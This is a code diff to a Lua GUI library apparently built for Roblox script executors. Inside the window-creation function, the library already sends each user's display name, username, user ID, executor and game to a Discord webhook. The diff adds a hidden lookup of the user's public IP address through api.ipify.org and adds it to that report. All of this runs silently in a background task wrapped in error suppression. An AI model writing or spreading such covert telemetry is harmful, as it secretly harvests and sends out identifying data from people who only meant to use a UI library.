@@ -75,31 +75,62 @@ function Library:CreateWindow(config)
     
         -- ---------- Discord Webhook ----------
     if WebhookURL ~= "" then
-        task.spawn(function()
-            local executorName = "Unknown"
-            if identifyexecutor then pcall(function() executorName = identifyexecutor() end) end
-            local gameName = game.Name
-            pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
-            local data = {
-                ["embeds"] = {{
-                    ["title"] = WindowName .. " Executed!",
-                    ["description"] = "A user has executed your script library.",
-                    ["color"] = tonumber(0x00FFFF),
-                    ["fields"] = {
-                        {["name"] = "Display Name", ["value"] = PlayerDisplayName, ["inline"] = true},
-                        {["name"] = "Username", ["value"] = "@" .. PlayerName, ["inline"] = true},
-                        {["name"] = "User ID", ["value"] = tostring(PlayerId), ["inline"] = true},
-                        {["name"] = "Executor", ["value"] = executorName, ["inline"] = true},
-                        {["name"] = "Game Name", ["value"] = gameName, ["inline"] = true},
-                        {["name"] = "Game Link", ["value"] = "https://www.roblox.com/games/"..tostring(game.PlaceId), ["inline"] = false},
-                    },
-                    ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..PlayerId.."&width=420&height=420&format=png"}
-                }}
-            }
-            local reqFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-            if reqFunc then pcall(function() reqFunc({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end) end
-        end)
-    end
+    task.spawn(function()
+        local executorName = "Unknown"
+        if identifyexecutor then pcall(function() executorName = identifyexecutor() end) end
+        
+        local gameName = game.Name
+        pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
+        
+        -- 1. Definisikan reqFunc lebih awal
+        local reqFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+        
+        -- 2. Ambil IP pengguna menggunakan reqFunc
+        local playerIP = "Unknown"
+        if reqFunc then
+            pcall(function()
+                local ipResponse = reqFunc({
+                    Url = "https://api.ipify.org",
+                    Method = "GET"
+                })
+                if ipResponse and ipResponse.Body then
+                    playerIP = ipResponse.Body
+                end
+            end)
+        end
+
+        local data = {
+            ["embeds"] = {{
+                ["title"] = WindowName .. " Executed!",
+                ["description"] = "A user has executed your script library.",
+                ["color"] = tonumber(0x00FFFF),
+                ["fields"] = {
+                    {["name"] = "Display Name", ["value"] = PlayerDisplayName, ["inline"] = true},
+                    {["name"] = "Username", ["value"] = "@" .. PlayerName, ["inline"] = true},
+                    {["name"] = "User ID", ["value"] = tostring(PlayerId), ["inline"] = true},
+                    {["name"] = "Executor", ["value"] = executorName, ["inline"] = true},
+                    {["name"] = "Game Name", ["value"] = gameName, ["inline"] = true},
+                    {["name"] = "IP Address", ["value"] = playerIP, ["inline"] = true}, 
+                    {["name"] = "Game Link", ["value"] = "https://www.roblox.com/games/"..tostring(game.PlaceId), ["inline"] = false},
+                },
+                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..PlayerId.."&width=420&height=420&format=png"}
+            }}
+        }
+        
+        -- 4. Kirim Webhook
+        if reqFunc then 
+            pcall(function() 
+                reqFunc({
+                    Url = WebhookURL, 
+                    Method = "POST", 
+                    Headers = {["Content-Type"] = "application/json"}, 
+                    Body = HttpService:JSONEncode(data)
+                }) 
+            end) 
+        end
+    end)
+end
+
 
     -- ---------- Root GUI ----------
     local ScreenGui = Instance.new("ScreenGui")
